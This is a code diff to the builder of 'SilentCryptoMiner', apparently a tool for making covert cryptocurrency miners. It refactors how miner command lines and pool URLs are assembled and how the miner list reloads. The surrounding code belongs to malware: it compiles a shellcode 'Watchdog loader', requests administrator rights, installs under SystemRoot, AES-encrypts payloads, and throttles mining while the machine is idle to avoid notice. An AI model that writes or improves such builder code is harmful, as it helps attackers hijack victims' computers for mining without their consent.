@@ -133,11 +133,11 @@ namespace SilentCryptoMiner
 
                     if (xmr)
                     {
-                        argstr.Append($"--algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : advancedParamsXMR)} --url={miner.txtPoolURL.Text} --user={miner.txtPoolUsername.Text} --pass={miner.txtPoolPassowrd.Text} --cpu-max-threads-hint={Invoke(new Func<string>(() => miner.txtMaxCPU.Text.Replace("%", "")))}");
+                        argstr.Append($"--algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : advancedParamsXMR)} --url={miner.txtPoolURL.Text} --user={miner.txtPoolUsername.Text} --pass={miner.txtPoolPassword.Text} --cpu-max-threads-hint={Invoke(new Func<string>(() => miner.comboMaxCPU.Text.Replace("%", "")))}");
                     }
                     else
                     {
-                        argstr.Append($"--cinit-algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} --pool={Invoke(new Func<string>(() => miner.comboPoolScheme.Text.Split(' ')[0])) + "://" + "`" + miner.txtPoolUsername.Text + "`" + (string.IsNullOrEmpty(miner.txtPoolWorker.Text) ? "" : "." + miner.txtPoolWorker.Text) + (string.IsNullOrEmpty(miner.txtPoolPassowrd.Text) ? "" : ":" + miner.txtPoolPassowrd.Text) + (string.IsNullOrEmpty(miner.txtPoolUsername.Text) ? "" : "@") + miner.txtPoolURL.Text + (string.IsNullOrEmpty(miner.txtPoolData.Text) ? "" : "/" + miner.txtPoolData.Text)} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : advancedParamsETH)} --cinit-max-gpu={Invoke(new Func<string>(() => miner.txtMaxGPU.Text.Replace("%", "")))}");
+                        argstr.Append($"--cinit-algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} --pool={formatETHUrl(miner)} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : advancedParamsETH)} --cinit-max-gpu={Invoke(new Func<string>(() => miner.comboMaxGPU.Text.Replace("%", "")))}");
                     }
 
                     if (miner.chkRemoteConfig.Checked)
@@ -185,14 +185,14 @@ namespace SilentCryptoMiner
 
                         if (miner.toggleIdle.Checked)
                         {
-                            argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-cpu={Invoke(new Func<string>(() => miner.txtIdleCPU.Text.Replace("%", "")))}");
+                            argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-cpu={Invoke(new Func<string>(() => miner.comboIdleCPU.Text.Replace("%", "")))}");
                         }
                     }
                     else
                     {
                         if (miner.toggleIdle.Checked)
                         {
-                            argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-gpu={Invoke(new Func<string>(() => miner.txtIdleGPU.Text.Replace("%", "")))}");
+                            argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-gpu={Invoke(new Func<string>(() => miner.comboIdleGPU.Text.Replace("%", "")))}");
                         }
                     }
                     string location = "SystemRoot";
@@ -221,7 +221,7 @@ namespace SilentCryptoMiner
                             if (toggleShellcode.Checked)
                             {
                                 BuildLog("Compiling Watchdog loader...");
-                                if (Codedom.LoaderCompiler(watchdogpath + "-loader.exe", watchdogpath + ".exe", $"\"{watchdogID}\"", null, false, toggleAdministrator.Checked, true))
+                                if (Codedom.LoaderCompiler(watchdogpath + "-loader.exe", watchdogpath + ".exe", $"\"{watchdogID}\"", null, false, toggleAdministrator.Checked))
                                 {
                                     watchdogdata = File.ReadAllBytes(watchdogpath + "-loader.exe");
                                     File.Delete(watchdogpath + "-loader.exe");                                   
@@ -310,6 +310,11 @@ namespace SilentCryptoMiner
                 BuildError("Error: An error occured while building the file: " + ex.Message);
                 return;
             }
+        }
+
+        public string formatETHUrl(MinerETH miner)
+        {
+            return Invoke(new Func<string>(() => miner.comboPoolScheme.Text.Split(' ')[0])) + "://" + "`" + miner.txtPoolUsername.Text + "`" + (string.IsNullOrEmpty(miner.txtPoolWorker.Text) ? "" : "." + miner.txtPoolWorker.Text) + (string.IsNullOrEmpty(miner.txtPoolPassowrd.Text) ? "" : ":" + miner.txtPoolPassowrd.Text) + (string.IsNullOrEmpty(miner.txtPoolUsername.Text) ? "" : "@") + miner.txtPoolURL.Text + (string.IsNullOrEmpty(miner.txtPoolData.Text) ? "" : "/" + miner.txtPoolData.Text);
         }
 
         public byte[] AES_Encryptor(byte[] input)
@@ -614,6 +619,7 @@ namespace SilentCryptoMiner
             {
                 ((dynamic)listMiners.SelectedItem).Hide();
                 listMiners.Items.Remove(listMiners.SelectedItem);
+                ReloadMinerList();
             }
         }
 
@@ -622,6 +628,7 @@ namespace SilentCryptoMiner
             int count = listMiners.Items.Count;
             for (int i = 0; i < count; i++)
             {
+                ((dynamic)listMiners.Items[i]).nid = i;
                 listMiners.Items[i] = listMiners.Items[i];
             }
         }
